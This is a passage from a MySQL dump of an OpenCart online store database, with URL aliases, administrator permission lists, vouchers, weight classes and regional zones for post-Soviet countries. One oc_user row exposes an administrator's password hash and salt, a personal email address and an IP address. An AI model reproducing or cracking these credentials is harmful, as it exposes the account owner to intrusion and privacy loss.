d=11','novost-1',3),(151,'record_id=11','novost-1',4),(152,'blog_id=10','proekty',1),(153,'blog_id=10','proekty',3),(154,'blog_id=10','proekty',4),(160,'record_id=12','proekt-1',4),(159,'record_id=12','proekt-1',3),(158,'record_id=12','proekt-1',1);
/*!40000 ALTER TABLE `oc_url_alias_blog` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_user` WRITE;
/*!40000 ALTER TABLE `oc_user` DISABLE KEYS */;
INSERT INTO `oc_user` VALUES (1,1,'admin','8e2488df75772137d63f2a2ee0fcafd76758fb7c','9ec57b7e0','John','Doe','dimonich41@gmail.com','','','77.47.231.38',1,'2016-02-26 15:41:47');
/*!40000 ALTER TABLE `oc_user` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_user_group` WRITE;
/*!40000 ALTER TABLE `oc_user_group` DISABLE KEYS */;
INSERT INTO `oc_user_group` VALUES (1,'Administrator','a:2:{s:6:\"access\";a:140:{i:0;s:15:\"agooa/adminmenu\";i:1;s:15:\"catalog/adapter\";i:2;s:17:\"catalog/attribute\";i:3;s:23:\"catalog/attribute_group\";i:4;s:12:\"catalog/blog\";i:5;s:16:\"catalog/category\";i:6;s:15:\"catalog/comment\";i:7;s:16:\"catalog/download\";i:8;s:14:\"catalog/fields\";i:9;s:14:\"catalog/filter\";i:10;s:19:\"catalog/information\";i:11;s:20:\"catalog/manufacturer\";i:12;s:14:\"catalog/option\";i:13;s:15:\"catalog/product\";i:14;s:14:\"catalog/record\";i:15;s:17:\"catalog/recurring\";i:16;s:14:\"catalog/review\";i:17;s:14:\"catalog/seocms\";i:18;s:18:\"common/column_left\";i:19;s:18:\"common/filemanager\";i:20;s:12:\"common/front\";i:21;s:11:\"common/menu\";i:22;s:14:\"common/profile\";i:23;s:12:\"common/stats\";i:24;s:13:\"design/banner\";i:25;s:13:\"design/layout\";i:26;s:14:\"extension/feed\";i:27;s:15:\"extension/fraud\";i:28;s:19:\"extension/installer\";i:29;s:22:\"extension/modification\";i:30;s:16:\"extension/module\";i:31;s:17:\"extension/openbay\";i:32;s:17:\"extension/payment\";i:33;s:18:\"extension/shipping\";i:34;s:15:\"extension/total\";i:35;s:16:\"feed/google_base\";i:36;s:19:\"feed/google_sitemap\";i:37;s:24:\"feed/google_sitemap_blog\";i:38;s:18:\"fraud/fraudlabspro\";i:39;s:13:\"fraud/maxmind\";i:40;s:20:\"localisation/country\";i:41;s:21:\"localisation/currency\";i:42;s:21:\"localisation/geo_zone\";i:43;s:21:\"localisation/language\";i:44;s:25:\"localisation/length_class\";i:45;s:21:\"localisation/location\";i:46;s:25:\"localisation/order_status\";i:47;s:26:\"localisation/return_action\";i:48;s:26:\"localisation/return_reason\";i:49;s:26:\"localisation/return_status\";i:50;s:25:\"localisation/stock_status\";i:51;s:22:\"localisation/tax_class\";i:52;s:21:\"localisation/tax_rate\";i:53;s:25:\"localisation/weight_class\";i:54;s:17:\"localisation/zone\";i:55;s:19:\"marketing/affiliate\";i:56;s:17:\"marketing/contact\";i:57;s:16:\"marketing/coupon\";i:58;s:19:\"marketing/marketing\";i:59;s:14:\"module/account\";i:60;s:16:\"module/affiliate\";i:61;s:13:\"module/banner\";i:62;s:17:\"module/bestseller\";i:63;s:11:\"module/blog\";i:64;s:15:\"module/carousel\";i:65;s:15:\"module/category\";i:66;s:15:\"module/featured\";i:67;s:13:\"module/filter\";i:68;s:22:\"module/google_hangouts\";i:69;s:11:\"module/html\";i:70;s:18:\"module/information\";i:71;s:13:\"module/latest\";i:72;s:16:\"module/pp_button\";i:73;s:15:\"module/pp_login\";i:74;s:16:\"module/slideshow\";i:75;s:14:\"module/special\";i:76;s:12:\"module/store\";i:77;s:21:\"payment/bank_transfer\";i:78;s:14:\"payment/cheque\";i:79;s:11:\"payment/cod\";i:80;s:21:\"payment/free_checkout\";i:81;s:14:\"payment/liqpay\";i:82;s:18:\"payment/pp_express\";i:83;s:14:\"payment/pp_pro\";i:84;s:19:\"payment/pp_standard\";i:85;s:16:\"report/affiliate\";i:86;s:25:\"report/affiliate_activity\";i:87;s:22:\"report/affiliate_login\";i:88;s:24:\"report/customer_activity\";i:89;s:22:\"report/customer_credit\";i:90;s:21:\"report/customer_login\";i:91;s:22:\"report/customer_online\";i:92;s:21:\"report/customer_order\";i:93;s:22:\"report/customer_reward\";i:94;s:16:\"report/marketing\";i:95;s:24:\"report/product_purchased\";i:96;s:21:\"report/product_viewed\";i:97;s:18:\"report/sale_coupon\";i:98;s:17:\"report/sale_order\";i:99;s:18:\"report/sale_return\";i:100;s:20:\"report/sale_shipping\";i:101;s:15:\"report/sale_tax\";i:102;s:17:\"sale/custom_field\";i:103;s:13:\"sale/customer\";i:104;s:20:\"sale/customer_ban_ip\";i:105;s:19:\"sale/customer_group\";i:106;s:10:\"sale/order\";i:107;s:14:\"sale/recurring\";i:108;s:11:\"sale/return\";i:109;s:12:\"sale/voucher\";i:110;s:18:\"sale/voucher_theme\";i:111;s:15:\"setting/setting\";i:112;s:13:\"setting/store\";i:113;s:17:\"shipping/citylink\";i:114;s:13:\"shipping/flat\";i:115;s:13:\"shipping/free\";i:116;s:13:\"shipping/item\";i:117;s:15:\"shipping/pickup\";i:118;s:15:\"shipping/weight\";i:119;s:11:\"tool/backup\";i:120;s:14:\"tool/error_log\";i:121;s:11:\"tool/upload\";i:122;s:12:\"total/coupon\";i:123;s:12:\"total/credit\";i:124;s:14:\"total/handling\";i:125;s:19:\"total/low_order_fee\";i:126;s:12:\"total/reward\";i:127;s:14:\"total/shipping\";i:128;s:15:\"total/sub_total\";i:129;s:9:\"total/tax\";i:130;s:11:\"total/total\";i:131;s:13:\"total/voucher\";i:132;s:8:\"user/api\";i:133;s:9:\"user/user\";i:134;s:20:\"user/user_permission\";i:135;s:11:\"module/blog\";i:136;s:11:\"module/html\";i:137;s:13:\"module/filter\";i:138;s:12:\"module/block\";i:139;s:15:\"module/prodline\";}s:6:\"modify\";a:140:{i:0;s:15:\"agooa/adminmenu\";i:1;s:15:\"catalog/adapter\";i:2;s:17:\"catalog/attribute\";i:3;s:23:\"catalog/attribute_group\";i:4;s:12:\"catalog/blog\";i:5;s:16:\"catalog/category\";i:6;s:15:\"catalog/comment\";i:7;s:16:\"catalog/download\";i:8;s:14:\"catalog/fields\";i:9;s:14:\"catalog/filter\";i:10;s:19:\"catalog/information\";i:11;s:20:\"catalog/manufacturer\";i:12;s:14:\"catalog/option\";i:13;s:15:\"catalog/product\";i:14;s:14:\"catalog/record\";i:15;s:17:\"catalog/recurring\";i:16;s:14:\"catalog/review\";i:17;s:14:\"catalog/seocms\";i:18;s:18:\"common/column_left\";i:19;s:18:\"common/filemanager\";i:20;s:12:\"common/front\";i:21;s:11:\"common/menu\";i:22;s:14:\"common/profile\";i:23;s:12:\"common/stats\";i:24;s:13:\"design/banner\";i:25;s:13:\"design/layout\";i:26;s:14:\"extension/feed\";i:27;s:15:\"extension/fraud\";i:28;s:19:\"extension/installer\";i:29;s:22:\"extension/modification\";i:30;s:16:\"extension/module\";i:31;s:17:\"extension/openbay\";i:32;s:17:\"extension/payment\";i:33;s:18:\"extension/shipping\";i:34;s:15:\"extension/total\";i:35;s:16:\"feed/google_base\";i:36;s:19:\"feed/google_sitemap\";i:37;s:24:\"feed/google_sitemap_blog\";i:38;s:18:\"fraud/fraudlabspro\";i:39;s:13:\"fraud/maxmind\";i:40;s:20:\"localisation/country\";i:41;s:21:\"localisation/currency\";i:42;s:21:\"localisation/geo_zone\";i:43;s:21:\"localisation/language\";i:44;s:25:\"localisation/length_class\";i:45;s:21:\"localisation/location\";i:46;s:25:\"localisation/order_status\";i:47;s:26:\"localisation/return_action\";i:48;s:26:\"localisation/return_reason\";i:49;s:26:\"localisation/return_status\";i:50;s:25:\"localisation/stock_status\";i:51;s:22:\"localisation/tax_class\";i:52;s:21:\"localisation/tax_rate\";i:53;s:25:\"localisation/weight_class\";i:54;s:17:\"localisation/zone\";i:55;s:19:\"marketing/affiliate\";i:56;s:17:\"marketing/contact\";i:57;s:16:\"marketing/coupon\";i:58;s:19:\"marketing/marketing\";i:59;s:14:\"module/account\";i:60;s:16:\"module/affiliate\";i:61;s:13:\"module/banner\";i:62;s:17:\"module/bestseller\";i:63;s:11:\"module/blog\";i:64;s:15:\"module/carousel\";i:65;s:15:\"module/category\";i:66;s:15:\"module/featured\";i:67;s:13:\"module/filter\";i:68;s:22:\"module/google_hangouts\";i:69;s:11:\"module/html\";i:70;s:18:\"module/information\";i:71;s:13:\"module/latest\";i:72;s:16:\"module/pp_button\";i:73;s:15:\"module/pp_login\";i:74;s:16:\"module/slideshow\";i:75;s:14:\"module/special\";i:76;s:12:\"module/store\";i:77;s:21:\"payment/bank_transfer\";i:78;s:14:\"payment/cheque\";i:79;s:11:\"payment/cod\";i:80;s:21:\"payment/free_checkout\";i:81;s:14:\"payment/liqpay\";i:82;s:18:\"payment/pp_express\";i:83;s:14:\"payment/pp_pro\";i:84;s:19:\"payment/pp_standard\";i:85;s:16:\"report/affiliate\";i:86;s:25:\"report/affiliate_activity\";i:87;s:22:\"report/affiliate_login\";i:88;s:24:\"report/customer_activity\";i:89;s:22:\"report/customer_credit\";i:90;s:21:\"report/customer_login\";i:91;s:22:\"report/customer_online\";i:92;s:21:\"report/customer_order\";i:93;s:22:\"report/customer_reward\";i:94;s:16:\"report/marketing\";i:95;s:24:\"report/product_purchased\";i:96;s:21:\"report/product_viewed\";i:97;s:18:\"report/sale_coupon\";i:98;s:17:\"report/sale_order\";i:99;s:18:\"report/sale_return\";i:100;s:20:\"report/sale_shipping\";i:101;s:15:\"report/sale_tax\";i:102;s:17:\"sale/custom_field\";i:103;s:13:\"sale/customer\";i:104;s:20:\"sale/customer_ban_ip\";i:105;s:19:\"sale/customer_group\";i:106;s:10:\"sale/order\";i:107;s:14:\"sale/recurring\";i:108;s:11:\"sale/return\";i:109;s:12:\"sale/voucher\";i:110;s:18:\"sale/voucher_theme\";i:111;s:15:\"setting/setting\";i:112;s:13:\"setting/store\";i:113;s:17:\"shipping/citylink\";i:114;s:13:\"shipping/flat\";i:115;s:13:\"shipping/free\";i:116;s:13:\"shipping/item\";i:117;s:15:\"shipping/pickup\";i:118;s:15:\"shipping/weight\";i:119;s:11:\"tool/backup\";i:120;s:14:\"tool/error_log\";i:121;s:11:\"tool/upload\";i:122;s:12:\"total/coupon\";i:123;s:12:\"total/credit\";i:124;s:14:\"total/handling\";i:125;s:19:\"total/low_order_fee\";i:126;s:12:\"total/reward\";i:127;s:14:\"total/shipping\";i:128;s:15:\"total/sub_total\";i:129;s:9:\"total/tax\";i:130;s:11:\"total/total\";i:131;s:13:\"total/voucher\";i:132;s:8:\"user/api\";i:133;s:9:\"user/user\";i:134;s:20:\"user/user_permission\";i:135;s:11:\"module/blog\";i:136;s:11:\"module/html\";i:137;s:13:\"module/filter\";i:138;s:12:\"module/block\";i:139;s:15:\"module/prodline\";}}'),(10,'Demonstration','');
/*!40000 ALTER TABLE `oc_user_group` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_voucher` WRITE;
/*!40000 ALTER TABLE `oc_voucher` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_voucher` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_voucher_history` WRITE;
/*!40000 ALTER TABLE `oc_voucher_history` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_voucher_history` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_voucher_theme` WRITE;
/*!40000 ALTER TABLE `oc_voucher_theme` DISABLE KEYS */;
INSERT INTO `oc_voucher_theme` VALUES (8,'catalog/demo/canon_eos_5d_2.jpg'),(7,'catalog/demo/gift-voucher-birthday.jpg'),(6,'catalog/demo/apple_logo.jpg');
/*!40000 ALTER TABLE `oc_voucher_theme` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_voucher_theme_description` WRITE;
/*!40000 ALTER TABLE `oc_voucher_theme_description` DISABLE KEYS */;
INSERT INTO `oc_voucher_theme_description` VALUES (6,1,'Новый год'),(7,1,'День рождения'),(8,1,'Другое'),(7,4,'День рождения'),(6,4,'Новый год'),(6,3,'Новый год'),(7,3,'День рождения'),(8,3,'Другое'),(8,4,'Другое');
/*!40000 ALTER TABLE `oc_voucher_theme_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_weight_class` WRITE;
/*!40000 ALTER TABLE `oc_weight_class` DISABLE KEYS */;
INSERT INTO `oc_weight_class` VALUES (1,'1.00000000'),(2,'1000.00000000'),(5,'2.20460000'),(6,'35.27400000');
/*!40000 ALTER TABLE `oc_weight_class` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_weight_class_description` WRITE;
/*!40000 ALTER TABLE `oc_weight_class_description` DISABLE KEYS */;
INSERT INTO `oc_weight_class_description` VALUES (1,1,'Килограмм','кг'),(2,1,'Грамм','г'),(1,4,'Килограмм','кг'),(1,3,'Килограмм','кг'),(2,3,'Грамм','г'),(2,4,'Грамм','г');
/*!40000 ALTER TABLE `oc_weight_class_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_zone` WRITE;
/*!40000 ALTER TABLE `oc_zone` DISABLE KEYS */;
INSERT INTO `oc_zone` VALUES (1,20,'Брест','BR',1),(2,20,'Гомель','HO',1),(3,20,'Минск','HM',1),(4,20,'Гродно','HR',1),(5,20,'Могилев','MA',1),(6,20,'Минская область','MI',1),(7,20,'Витебск','VI',1),(8,80,'Abkhazia','AB',1),(9,80,'Ajaria','AJ',1),(10,80,'Tbilisi','TB',1),(11,80,'Guria','GU',1),(12,80,'Imereti','IM',1),(13,80,'Kakheti','KA',1),(14,80,'Kvemo Kartli','KK',1),(15,80,'Mtskheta-Mtianeti','MM',1),(16,80,'Racha Lechkhumi and Kvemo Svanet','RL',1),(17,80,'Samegrelo-Zemo Svaneti','SZ',1),(18,80,'Samtskhe-Javakheti','SJ',1),(19,80,'Shida Kartli','SK',1),(20,109,'Алматинская область','AL',1),(21,109,'Алматы - город республ-го значения','AC',1),(22,109,'Акмолинская область','AM',1),(23,109,'Актюбинская область','AQ',1),(24,109,'Астана - город республ-го значения','AS',1),(25,109,'Атырауская область','AT',1),(26,109,'Западно-Казахстанская область','BA',1),(27,109,'Байконур - город республ-го значения','BY',1),(28,109,'Мангистауская область','MA',1),(29,109,'Южно-Казахстанская область','ON',1),(30,109,'Павлодарская область','PA',1),(31,109,'Карагандинская область','QA',1),(32,109,'Костанайская область','QO',1),(33,109,'Кызылординская область','QY',1),(34,109,'Восточно-Казахстанская область','SH',1),(35,109,'Северо-Казахстанская область','SO',1),(36,109,'Жамбылская область','ZH',1),(37,115,'Bishkek','GB',1),(38,115,'Batken','B',1),(39,115,'Chu','C',1),(40,115,'Jalal-Abad','J',1),(41,115,'Naryn','N',1),(42,115,'Osh','O',1),(43,115,'Talas','T',1),(44,115,'Ysyk-Kol','Y',1),(45,176,'Республика Хакасия','KK',1),(46,176,'Московская область','MOS',1),(47,176,'Чукотский АО','CHU',1),(48,176,'Архангельская область','ARK',1),(49,176,'Астраханская область','AST',1),(50,176,'Алтайский край','ALT',1),(51,176,'Белгородская область','BEL',1),(52,176,'Еврейская АО','YEV',1),(53,176,'Амурская область','AMU',1),(54,176,'Брянская область','BRY',1),(55,176,'Чувашская Республика','CU',1),(56,176,'Челябинская область','CHE',1),(57,176,'Карачаево-Черкеcсия','KC',1),(58,176,'Забайкальский край','ZAB',1),(59,176,'Ленинградская область','LEN',1),(60,176,'Республика Калмыкия','KL',1),(61,176,'Сахалинская область','SAK',1),(62,176,'Республика Алтай','AL',1),(63,176,'Чеченская Республика','CE',1),(64,176,'Иркутская область','IRK',1),(65,176,'Ивановская область','IVA',1),(66,176,'Удмуртская Республика','UD',1),(67,176,'Калининградская область','KGD',1),(68,176,'Калужская область','KLU',1),(69,176,'Республика Татарстан','TA',1),(70,176,'Кемеровская область','KEM',1),(71,176,'Хабаровский край','KHA',1),(72,176,'Ханты-Мансийский АО - Югра','KHM',1),(73,176,'Костромская область','KOS',1),(74,176,'Краснодарский край','KDA',1),(75,176,'Красноярский край','KYA',1),(76,176,'Курганская область','KGN',1),(77,176,'Курская область','KRS',1),(78,176,'Республика Тыва','TY',1),(79,176,'Липецкая область','LIP',1),(80,176,'Магаданская область','MAG',1),(81,176,'Республика Дагестан','DA',1),(82,176,'Республика Адыгея','AD',1),(83,176,'Москва','MOW',1),(84,176,'Мурманская область','MUR',1),(85,176,'Республика Кабардино-Балкария','KB',1),(86,176,'Ненецкий АО','NEN',1),(87,176,'Республика Ингушетия','IN',1),(88,176,'Нижегородская область','NIZ',1),(89,176,'Новгородская область','NGR',1),(90,176,'Новосибирская область','NVS',1),(91,176,'Омская область','OMS',1),(92,176,'Орловская область','ORL',1),(93,176,'Оренбургская область','ORE',1),(94,176,'Пензенская область','PNZ',1),(95,176,'Пермский край','PER',1),(96,176,'Камчатский край','KAM',1),(97,176,'Республика Карелия','KR',1),(98,176,'Псковская область','PSK',1),(99,176,'Ростовская область','ROS',1),(100,176,'Рязанская область','RYA',1),(101,176,'Ямало-Ненецкий АО','YAN',1),(102,176,'Самарская область','SAM',1),(103,176,'Республика Мордовия','MO',1),(104,176,'Саратовская область','SAR',1),(105,176,'Смоленская область','SMO',1),(106,176,'Санкт-Петербург','SPE',1),(107,176,'Ставропольский край','STA',1),(108,176,'Республика Коми','KO',1),(109,176,'Тамбовская область','TAM',1),(110,176,'Томская область','TOM',1),(111,176,'Тульская область','TUL',1),(112,176,'Тверская область','TVE',1),(113,176,'Тюменская область','TYU',1),(114,176,'Республика Башкортостан','BA',1),(115,176,'Ульяновская область','ULY',1),(116,176,'Республика Бурятия','BU',1),(117,176,'Республика Северная Осетия','SE',1),(118,176,'Владимирская область','VLA',1),(119,176,'Приморский край','PRI',1),(120,176,'Волгоградская область','VGG',1),(121,176,'Вологодская область','VLG',1),(122,176,'Воронежская область','VOR',1),(123,176,'Кировская область','KIR',1),(124,176,'Республика Саха','SA',1),(125,176,'Ярославская область','YAR',1),(126,176,'Свердловская область','SVE',1),(127,176,'Республика Марий Эл','ME',1),(128,176,'Республика Крым','CR',1),(129,220,'Черкассы','CK',1),(130,220,'Чернигов','CH',1),(131,220,'Черновцы','CV',1),(132,220,'Днепропетровск','DN',1),(133,220,'Донецк','DO',1),(134,220,'Ивано-Франковск','IV',1),(135,220,'Харьков','KH',1),(136,220,'Хмельницкий','KM',1),(137,220,'Кировоград','KR',1),(138,220,'Киевская область','KV',1),(139,220,'Киев','KY',1),(140,220,'Луганск','LU',1),(141,220,'Львов','LV',1),(142,220,'Николаев','MY',1),(143,220,'Одесса','OD',1),(144,220,'Полтава','PO',1),(145,220,'Ровно','RI',1),(146,176,'Севастополь','SE',1),(147,220,'Сумы','SU',1),(148,220,'Тернополь','TE',1),(149,220,'Винница','VI',1),(150,220,'Луцк','VO',1),(151,220,'Ужгород','ZK',1),(152,220,'Запорожье','ZA',1),(153,220,'Житомир','ZH',1),(154,220,'Херсон','KE',1),(155,226,'Andijon','AN',1),(156,226,'Buxoro','BU',1),(157,226,'Farg\'ona','FA',1),(158,226,'Jizzax','JI',1),(159,226,'Namangan','NG',1),(160,226,'Navoiy','NW',1),(161,226,'Qashqadaryo','QA',1),(162,226,'Qoraqalpog\'iston Republikasi','QR',1),(163,226,'Samarqand','SA',1),(164,226,'Sirdaryo','SI',1),(165,226,'Surxondaryo','SU',1),(166,226,'Toshkent City','TK',1),(167,226,'Toshkent Region','TO',1),(168,226,'Xorazm','XO',1);
/*!40000 ALTER TABLE `oc_zone` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_zone_to_geo_zone` WRITE;
/*!40000 ALTER TABLE `oc_zone_to_geo_zone` DISABLE KEYS */;
INSERT INTO `oc_zone_to_geo_zone` VALUES (1,222,0,4,'0000-00-00 00:00:00','0000-00-00 00:00:00'),(110,176,0,3,'2014-09-09 11:48:13','0000-00-00 00:00:00');
/*!40000 ALTER TABLE `oc_zone_to_geo_zone` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

